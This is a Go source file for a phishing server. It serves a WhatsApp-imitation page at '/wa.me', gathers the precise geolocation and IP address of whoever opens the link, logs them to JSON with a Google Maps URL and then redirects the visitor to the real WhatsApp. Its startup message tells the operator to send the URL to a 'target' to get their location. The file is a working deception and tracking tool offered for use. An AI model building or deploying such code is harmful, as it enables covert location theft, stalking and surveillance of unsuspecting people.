package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"time"
)

const SERVER_PORT int32 = 8080

const TEMPLATE_NAME string = "whatsapp.html"
const FINAL_REDIRECTION string = "https://api.whatsapp.com/?lang=en"
const GMAPS_URL string = "https://google.com/maps/place"

type GeoErrorCode int8

const (
	SUCCESS           GeoErrorCode = 0
	PERMISSION_DENIED GeoErrorCode = 1
	UNAVAILABLE       GeoErrorCode = 2
	TIMEOUT           GeoErrorCode = 3
)

type Context struct {
	done int
}

type Result struct {
	status string
}

type GeoLocationInfo struct {
	Status    GeoErrorCode `json:"status"`
	Longitude string       `json:"longitude"`
	Latitude  string       `json:"latitude"`
}

func (g *GeoLocationInfo) GenerateGMapsURL() string {
	return GMAPS_URL + "/" + g.Longitude + "," + g.Latitude
}

type TargetUser struct {
	GeoInfo   GeoLocationInfo `json:"geo_info"`
	IpAddress string          `json:"ip_address"`
}

func (t *TargetUser) save() error {
	now := time.Now()
	filename := now.Format("2006-01-02 15:04:05") + ".json"

	content, _ := json.MarshalIndent(t, "", " ")
	return os.WriteFile("logs/"+filename, content, 0600)
}

func PageViewHandler(response http.ResponseWriter, request *http.Request) {
	log.Println("["+request.RemoteAddr+"]", "Target is viewing the page")
	thtml, _ := template.ParseFiles("templates/" + TEMPLATE_NAME)
	thtml.Execute(response, nil)
}

func ResultHandler(response http.ResponseWriter, request *http.Request) {
	log.Println("["+request.RemoteAddr+"]", "Incoming result")

	var geoInfo GeoLocationInfo

	err := json.NewDecoder(request.Body).Decode(&geoInfo)

	if err != nil {
		log.Println("["+request.RemoteAddr+"]", "Bad result")
		http.Error(response, err.Error(), http.StatusBadRequest)
		return
	}

	targetUser := TargetUser{
		GeoInfo:   geoInfo,
		IpAddress: request.RemoteAddr,
	}

	err = targetUser.save()

	if err != nil {
		log.Println("Fail to write to a file")
		http.Error(response, err.Error(), http.StatusBadRequest)
		return
	}

	if geoInfo.Status != SUCCESS {
		log.Println("["+request.RemoteAddr+"]", "Error Result:", geoInfo.Status)
	}

	log.Println("["+request.RemoteAddr+"]", "Result:", geoInfo.GenerateGMapsURL())
	response.WriteHeader(http.StatusOK)
	fmt.Fprintf(response, "Ok")
}

func RedirectHandler(response http.ResponseWriter, request *http.Request) {
	log.Println("["+request.RemoteAddr+"]", "Redirecting user to", FINAL_REDIRECTION)
	http.Redirect(response, request, FINAL_REDIRECTION, http.StatusPermanentRedirect)
}

func PrintInto() {
	fmt.Println("WHERE ARE YOU? :)")
	fmt.Println("Local Server : http://localhost:8080")
	fmt.Println("URL          : http://localhost:8080/wa.me")
	fmt.Println("Send the URL to target to get their location. Result will be logged as GMaps URL and log to JSON file")
	fmt.Println()
}

func RunServer() {
	mux := http.NewServeMux()

	mux.HandleFunc("/wa.me", PageViewHandler)
	mux.HandleFunc("/redirect", RedirectHandler)
	mux.HandleFunc("/result", ResultHandler)

	server := &http.Server{
		Addr:    ":8080",
		Handler: mux,
	}

	log.Println("Start sniffing...")
	log.Fatal(server.ListenAndServe())
}

func main() {
	PrintInto()
	RunServer()
}
